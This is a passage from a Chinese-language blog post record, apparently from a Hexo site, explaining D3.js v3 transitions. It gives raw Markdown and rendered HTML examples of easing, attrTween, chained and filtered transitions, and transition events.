quantize(t);\n        }\n\n        svg.append('g')\n            .attr('class', 'container')\n            .append('rect')\n            .attr('x', 0)\n            .attr('y', 20)\n            .attr('height', 20)\n            .attr('width', 40)\n            .transition()\n            .duration(4000)\n            .ease('linear')\n            .attr('width', 400);\n\n        svg.append('g')\n            .attr('class', 'container')\n            .append('rect')\n            .attr('x', 0)\n            .attr('y', 60)\n            .attr('height', 20)\n            .attr('width', 40)\n            .transition()\n            .duration(4000)\n            .ease('linear')\n            .attrTween('width', widthTween);\n    </script>\n\n</body>\n\n</html>\n```\n\n### 联级过渡\n\n```js\nsvg.append('g')\n    .attr('class', 'container')\n.append('rect')\n    .attr('x', 0)\n    .attr('y', 20)\n    .attr('height', 20)\n    .attr('width', 40)\n.transition()\n    .duration(2000)\n    .ease('linear')\n    .attr('width', 400)\n.transition()\n    .duration(1000)\n    .attr('height', 60)\n.transition()\n    .duration(1000)\n    .style('fill', '#00f');\n```\n\n### 选择性过渡\n\n```js\nlet data = ['Cat', 'Dog', 'Cat', 'Dog', 'Cat', 'Dog', 'Cat', 'Dog'];\n\nsvg.append('g')\n    .attr('class', 'container')\n.selectAll('rect')\n    .data(data)\n    .enter()\n.append('text')\n    .attr('class', 'text-item')\n    .attr('x', 10)\n    .attr('y', (data, i) => (i + 1) * 40)\n    .text(data => data)\n.transition()\n    .duration(1000)\n    .ease('bounce')\n    .attr('x', 500)\n.filter((data) => data === 'Cat')\n.transition()\n    .duration(600)\n    .ease('linear')\n    .attr('x', 20);\n```\n\n### 监听过渡事件\n\n```js\nlet data = ['Cat', 'Dog', 'Cat', 'Dog', 'Cat', 'Dog', 'Cat', 'Dog'];\n\nsvg.append('g')\n    .attr('class', 'container')\n.selectAll('rect')\n    .data(data)\n    .enter()\n.append('text')\n    .attr('class', 'text-item')\n    .attr('x', 10)\n    .attr('y', (data, i) => (i + 1) * 40)\n    .text(data => data)\n.transition()\n    .duration(1000)\n    .ease('bounce')\n    .attr('x', 500)\n.filter((data) => data === 'Cat')\n.transition()\n    .duration(600)\n    .ease('linear')\n    .each('start', function (data) { // 动画开始\n        d3.select(this).text(data.toUpperCase());\n    })\n    .each('end', function () { // 动画结束\n        d3.select(this).text('end');\n    })\n    .each('interrupt', function () { // 动画被打断\n        d3.select(this).text('interrupt');\n    })\n    .attr('x', 20);\n```","slug":"D3.js/过渡","published":1,"updated":"2021-04-28T02:31:04.335Z","_id":"cko0u126z0009y26rczb7c1qt","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"过渡\"><a href=\"#过渡\" class=\"headerlink\" title=\"过渡\"></a>过渡</h1><p><code>d3.selection.trasition</code> 返回一个具备过渡能力的选集</p>\n<blockquote>\n<p><code>d3.selection.data(dataSet, fn)</code> 的第二个参数 <code>fn</code> 数被称为对象标识函数。这个函数确保了返回对象的一致性，使数据和图形元素之间的绑定更稳定。为了保证一致性，每一个数据都应当具备一个唯一的标识，然后下次更新选集时，即便 value 发生了变化，相同 id 的数据仍然对应同一个元素。</p>\n</blockquote>\n<p>D3 过渡并不要求每个被插值的数值都有明确的起始值和结束值。</p>\n<ul>\n<li>如果缺失起始值，它将试图使用计算出的样式</li>\n<li>如果缺失结束值，则将当前值作为常量</li>\n</ul>\n<h3 id=\"过渡效果\"><a href=\"#过渡效果\" class=\"headerlink\" title=\"过渡效果\"></a>过渡效果</h3><ul>\n<li><code>transition.duration(duration)</code>: <code>duration</code> 指定动画的持续时间，默认为 250ms，可传入具体数值或函数</li>\n<li><code>transition.delay(delay)</code>: <code>delay</code> 指定动画的延迟时间，默认为 0， 可传入具体数值或函数</li>\n<li><code>transition.ease(type)</code>: <code>type</code> 指定动画的缓动函数，默认缓动函数是 <code>cubic-in-out</code>，不可传入函数（通过使用 <code>attrTween</code> 或 <code>styleTween</code> 插值器中内置的定制缓动功能）<ul>\n<li>缓动模式: <code>lnear</code>、<code>cubic</code>、<code>cubic-in-out</code>、<code>sin</code>、<code>sin-out</code>、<code>exp</code>、<code>circle</code>、<code>back</code>、<code>bounce</code></li>\n<li>缓动模式修饰符: <code>in</code>、 <code>out</code>、 <code>in-out</code>、 <code>out-in</code></li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .rect-item &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: <span class=\"number\">#090</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> padding = <span class=\"number\">30</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> dataSet = [];</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> id = <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> container = svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span>(<span class=\"params\">data</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> rects = container.selectAll(<span class=\"string\">&#x27;rect&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .data(data, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> data.id);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> xScale = d3.scale.linear()</span></span><br><span class=\"line\">                .domain([0, data.length])</span><br><span class=\"line\">                .range([0, w - padding * 2]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> yScale = d3.scale.linear()</span></span><br><span class=\"line\"><span class=\"javascript\">                .domain([<span class=\"number\">0</span>, d3.max(data, <span class=\"function\">(<span class=\"params\">d</span>) =&gt;</span> d.value)])</span></span><br><span class=\"line\">                .range([h - padding * 2, 0]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// update</span></span></span><br><span class=\"line\"><span class=\"javascript\">            rects.attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;rect-item&#x27;</span>)</span></span><br><span class=\"line\">                .transition()</span><br><span class=\"line\">                .duration(500)</span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> xScale(i))</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> yScale(data.value))</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">20</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> h - padding - yScale(data.value));  </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// enter</span></span></span><br><span class=\"line\">            rects.enter()</span><br><span class=\"line\"><span class=\"javascript\">                .append(<span class=\"string\">&#x27;rect&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">&#x27;translate(0, 100)&#x27;</span>)</span></span><br><span class=\"line\">                .transition()</span><br><span class=\"line\">                .duration(500)</span><br><span class=\"line\">                .delay(200)</span><br><span class=\"line\"><span class=\"javascript\">                .ease(<span class=\"string\">&#x27;ease-in-out&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;rect-item&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"function\">(<span class=\"params\">data, i</span>) =&gt;</span> xScale(i))</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> yScale(data.value))</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">20</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">&#x27;translate(0, 40)&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> h - padding - yScale(data.value));</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"comment\">// exit</span></span></span><br><span class=\"line\">            rects.exit()</span><br><span class=\"line\">                .transition()</span><br><span class=\"line\">                .duration(500)</span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;x&#x27;</span>, -<span class=\"number\">40</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;opacity&#x27;</span>, <span class=\"number\">0</span>)</span></span><br><span class=\"line\">                .remove();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getRandomData</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.round(<span class=\"built_in\">Math</span>.random() * <span class=\"number\">20</span>) + <span class=\"number\">5</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">15</span>; i++) &#123;</span></span><br><span class=\"line\">            dataSet.push(&#123;</span><br><span class=\"line\">                id: ++id,</span><br><span class=\"line\">                value: getRandomData()</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        render(dataSet);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"built_in\">window</span>.setInterval(<span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\">            dataSet.shift();</span><br><span class=\"line\">            dataSet.push(&#123;</span><br><span class=\"line\">                id: ++id,</span><br><span class=\"line\">                value: getRandomData()</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            render(dataSet);</span><br><span class=\"line\">        &#125;, 2000);</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"中间帧动画\"><a href=\"#中间帧动画\" class=\"headerlink\" title=\"中间帧动画\"></a>中间帧动画</h3><ul>\n<li><code>attrTween(name, tween)</code>: 据指定的补间函数 <code>tween</code>，通过指定的名称过渡属性值</li>\n<li><code>styleTween(name, tween)</code>: 据指定的补间函数 <code>tween</code>，通过指定的 CSS 样式的属性值</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        rect &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: <span class=\"number\">#090</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">widthTween</span> (<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> quantize = d3.scale.quantize()</span></span><br><span class=\"line\">                .domain([0, 1])</span><br><span class=\"line\">                .range([40, 80, 120, 160, 200, 240, 280, 320, 360, 400]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">return</span> <span class=\"function\">(<span class=\"params\">t</span>) =&gt;</span> quantize(t);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;rect&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">0</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">20</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"number\">20</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">40</span>)</span></span><br><span class=\"line\">            .transition()</span><br><span class=\"line\">            .duration(4000)</span><br><span class=\"line\"><span class=\"javascript\">            .ease(<span class=\"string\">&#x27;linear&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">400</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;rect&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">0</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">60</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"number\">20</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">40</span>)</span></span><br><span class=\"line\">            .transition()</span><br><span class=\"line\">            .duration(4000)</span><br><span class=\"line\"><span class=\"javascript\">            .ease(<span class=\"string\">&#x27;linear&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attrTween(<span class=\"string\">&#x27;width&#x27;</span>, widthTween);</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"联级过渡\"><a href=\"#联级过渡\" class=\"headerlink\" title=\"联级过渡\"></a>联级过渡</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span><br><span class=\"line\">.append(<span class=\"string\">&#x27;rect&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">2000</span>)</span><br><span class=\"line\">    .ease(<span class=\"string\">&#x27;linear&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;width&#x27;</span>, <span class=\"number\">400</span>)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">1000</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;height&#x27;</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">.transition()</span><br><span class=\"line\">    .duration(<span class=\"number\">1000</span>)</span><br><span class=\"line\">    .style(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"string\">&#x27;#00f&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"选择性过渡\"><a href=\"#选择性过渡\" class=\"headerlink\" title=\"选择性过渡\"></a>选择性过渡</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> data = [<span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>, <span class=\"string\">&#x27;Cat&#x27;</span>, <span class=\"string\">&#x27;Dog&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>)</span><br><span class=\"line\">.selectAll(<span class=\"string\">&#x27;rect&#x27;</span>)</span><br><span class=\"line\">    .data(data)</span><br><span class=\"line\">    .enter()</span><br><span class=\"line\">.append(<span class=\"string\">&#x27;text&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;text-item&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">    